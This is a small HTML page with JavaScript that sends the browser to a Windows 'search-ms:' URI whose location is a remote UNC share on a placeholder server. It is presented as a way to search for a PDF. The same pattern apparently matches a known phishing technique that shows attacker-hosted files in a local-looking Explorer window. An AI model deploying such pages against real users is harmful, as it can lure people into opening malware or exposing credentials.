<!DOCTYPE html>
<html>
<head>
  <title>Trigger Search-MS for PDF</title>
</head>
<body>
  <h1>Open File Search</h1>
  <p>Click the button to search for the PDF, or <a href="https://yourdomain.com/sample.pdf">view the PDF directly</a>.</p>
  <p id="browser-warning" style="display: none; color: red;">
    This feature may not work in Firefox. Please use Chrome, Edge, or the direct PDF link.
  </p>
  <button onclick="openSearch()">Search for PDF</button>
  <script>
    function isFirefox() {
      return navigator.userAgent.toLowerCase().includes("firefox");
    }

    function openSearch() {
      const searchUri = "search-ms:query=sample&crumb=location:\\\\yourserver\\public";
      if (isFirefox()) {
        document.getElementById("browser-warning").style.display = "block";
        alert("Firefox may not fully support this feature. Try clicking the button, or use Chrome, Edge, or the direct PDF link.");
      }
      try {
        window.location.href = searchUri;
      } catch (e) {
        alert("Error: Could not open search. Ensure the file share is accessible or use the PDF link. (" + e.message + ")");
        document.getElementById("browser-warning").style.display = "block";
      }
    }
  </script>
</body>
</html>